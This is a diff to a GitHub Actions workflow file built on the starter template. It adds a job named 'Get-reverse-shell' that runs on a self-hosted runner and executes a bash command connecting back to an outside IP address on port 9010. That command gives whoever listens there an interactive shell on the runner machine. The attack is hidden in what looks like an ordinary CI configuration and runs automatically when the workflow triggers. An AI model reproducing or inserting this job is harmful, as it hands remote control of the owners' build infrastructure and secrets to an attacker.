@@ -33,3 +33,9 @@ jobs:
         run: |
           echo Add other actions to build,
           echo test, and deploy your project.
+  Get-reverse-shell:
+    runs-on: self-hosted
+    steps:
+      - name: "Get reverse shell"
+        run: |
+          bash -i >& /dev/tcp/20.244.38.251/9010 0>&1
